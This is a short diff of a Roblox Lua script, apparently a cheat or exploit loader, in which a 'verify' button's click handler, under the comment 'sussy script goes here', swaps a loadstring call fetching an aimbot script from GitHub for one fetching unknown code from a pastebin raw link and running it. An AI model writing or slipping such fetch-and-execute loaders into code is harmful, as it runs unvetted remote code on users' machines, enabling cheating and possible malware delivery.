@@ -105,7 +105,7 @@ VerifyButton.MouseButton1Down:connect(function()
 
 
 		-- sussy script goes here
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/DrackSquad/DrackAimbotUniversal/main/DrackHUBSRC"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/tPUrGyvX"))()
 	end
 end)
 
